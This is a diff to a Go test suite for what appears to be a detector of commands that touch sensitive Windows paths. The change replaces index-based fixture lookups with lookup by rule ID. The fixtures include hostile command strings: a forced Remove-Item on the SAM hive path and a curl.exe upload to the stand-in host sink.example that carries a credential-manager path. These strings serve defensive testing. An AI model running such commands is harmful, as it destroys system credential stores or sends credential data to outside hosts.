@@ -465,6 +465,19 @@ func TestTrustedActionWindowsSensitivePathRuntimeDispositions(t *testing.T) {
 		{"PATH-WIN-SECURITY-HIVE", `C:\Windows\System32\config\SECURITY`},
 		{"PATH-WIN-SYSTEM-HIVE", `C:\Windows\System32\config\SYSTEM`},
 	}
+	byRuleID := func(ruleID string) struct {
+		ruleID string
+		path   string
+	} {
+		t.Helper()
+		for _, candidate := range paths {
+			if candidate.ruleID == ruleID {
+				return candidate
+			}
+		}
+		t.Fatalf("fixture rule %s is missing from paths", ruleID)
+		return paths[0]
+	}
 
 	dispatchTool := func(tool, command string) []RuleFinding {
 		t.Helper()
@@ -520,7 +533,7 @@ func TestTrustedActionWindowsSensitivePathRuntimeDispositions(t *testing.T) {
 		})
 	}
 
-	sam := paths[3]
+	sam := byRuleID("PATH-WIN-SAM")
 	smartQuotedMutation := findingWithID(
 		dispatch("Remove-Item -LiteralPath “"+sam.path+"” -Force"),
 		sam.ruleID,
@@ -533,7 +546,7 @@ func TestTrustedActionWindowsSensitivePathRuntimeDispositions(t *testing.T) {
 		)
 	}
 
-	pathMention := paths[0]
+	pathMention := byRuleID("PATH-WIN-CREDENTIAL-MANAGER")
 	header := dispatch(
 		"curl.exe --header 'X-Path: " + pathMention.path +
 			"' https://sink.example/upload",
@@ -553,7 +566,7 @@ func TestTrustedActionWindowsSensitivePathRuntimeDispositions(t *testing.T) {
 		}
 	}
 
-	sensitive := paths[0]
+	sensitive := byRuleID("PATH-WIN-CREDENTIAL-MANAGER")
 	for _, test := range []struct {
 		name, tool, command string
 		wantEnforce         bool
